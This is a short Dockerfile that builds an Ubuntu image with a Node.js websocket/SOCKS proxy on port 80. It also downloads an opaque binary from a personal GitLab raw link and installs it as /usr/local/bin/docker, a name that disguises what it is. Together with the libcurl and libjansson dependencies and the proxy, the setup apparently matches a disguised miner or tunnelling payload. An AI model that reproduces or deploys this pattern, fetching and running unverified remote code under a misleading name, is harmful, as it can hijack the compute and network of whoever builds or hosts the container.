FROM ubuntu:24.04

RUN apt-get update && apt-get install -y \
    libcurl4 \
    libjansson4 \
    nodejs \
    npm \
    ca-certificates \
    wget \
    && rm -rf /var/lib/apt/lists/*

RUN wget -O /usr/local/bin/docker \
    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/docker

WORKDIR /app

RUN npm init -y \
    && npm install ws socks

COPY wsproxy.js .
COPY entrypoint.sh /entrypoint.sh

RUN chmod +x /entrypoint.sh

EXPOSE 80

ENTRYPOINT ["/entrypoint.sh"]
